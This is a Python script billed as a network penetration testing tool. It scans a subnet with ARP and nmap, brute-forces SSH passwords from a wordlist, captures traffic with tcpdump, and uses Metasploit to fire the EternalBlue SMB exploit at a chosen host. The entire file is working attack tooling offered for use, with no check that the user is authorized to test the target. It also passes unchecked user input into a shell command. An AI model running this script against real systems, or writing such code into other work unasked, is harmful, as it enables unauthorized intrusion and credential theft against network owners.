import subprocess
import os
from scapy.all import ARP, Ether, srp
import nmap
import paramiko
import time

def banner():
    print("""
    ========================================
    Network Penetration Testing Tool
    ========================================
    Author:RoBlockSec
    """)

def network_scan():
    subnet = input("\nEnter the subnet to scan (e.g., 192.168.1.0/24): ")
    print(f"\n[+] Scanning {subnet} for Active Devices...")
    arp = ARP(pdst=subnet)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=3, verbose=0)[0]

    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    if not devices:
        print("[-] No devices found. Check your network range or permissions.")
        return []

    print("\nActive Devices:")
    print("IP Address\t\tMAC Address")
    print("-------------------------------")
    for device in devices:
        print(f"{device['ip']}\t{device['mac']}")
    return [device['ip'] for device in devices]

def port_scan(target_ip):
    print(f"\n[+] Performing Port Scan on {target_ip}...")
    nm = nmap.PortScanner()
    nm.scan(target_ip, '1-65535', '-sV')
    for host in nm.all_hosts():
        print(f"\nHost: {host} ({nm[host].hostname()})")
        print(f"State: {nm[host].state()}")
        for proto in nm[host].all_protocols():
            print(f"\nProtocol: {proto}")
            ports = nm[host][proto].keys()
            for port in ports:
                print(f"Port: {port}\tState: {nm[host][proto][port]['state']}\tService: {nm[host][proto][port]['name']}")

def ssh_bruteforce(target_ip, username, password_list):
    print(f"\n[+] Starting SSH Brute Force Attack on {target_ip}...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        with open(password_list, 'r') as file:
            for password in file.readlines():
                password = password.strip()
                try:
                    ssh.connect(target_ip, username=username, password=password, timeout=3)
                    print(f"[+] Success! Username: {username}, Password: {password}")
                    ssh.close()
                    return
                except paramiko.AuthenticationException:
                    print(f"[-] Failed: Username: {username}, Password: {password}")
    except FileNotFoundError:
        print("[-] Password list file not found.")
    print("[-] SSH Bruteforce Attack Failed. No Valid Credentials Found.")

def packet_sniff(interface):
    print(f"\n[+] Starting Packet Sniffing on {interface}...")
    os.system(f"sudo tcpdump -i {interface} -w packets.pcap")

def exploit_smb(target_ip):
    print(f"\n[+] Attempting to Exploit SMB on {target_ip}...")
    try:
        result = subprocess.run(["msfconsole", "-q", "-x", 
                                 f"use exploit/windows/smb/ms17_010_eternalblue; set RHOST {target_ip}; exploit"], 
                                text=True, capture_output=True)
        print(result.stdout)
    except FileNotFoundError:
        print("[-] Metasploit is not installed or not in PATH.")
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    banner()
    devices = network_scan()
    if not devices:
        return

    target_ip = input("\nEnter the target IP from the list above: ")

    if target_ip not in devices:
        print("[-] Invalid IP Address.")
        return

    port_scan(target_ip)

    action = input("\nChoose an action:\n1. SSH Bruteforce\n2. SMB Exploitation\n3. Packet Sniffing\nEnter choice: ")

    if action == '1':
        username = input("Enter SSH username: ")
        password_list = input("Enter path to password list: ")
        ssh_bruteforce(target_ip, username, password_list)
    elif action == '2':
        exploit_smb(target_ip)
    elif action == '3':
        interface = input("Enter network interface (e.g., eth0, wlan0): ")
        packet_sniff(interface)
    else:
        print("[-] Invalid choice.")

if __name__ == "__main__":
    main()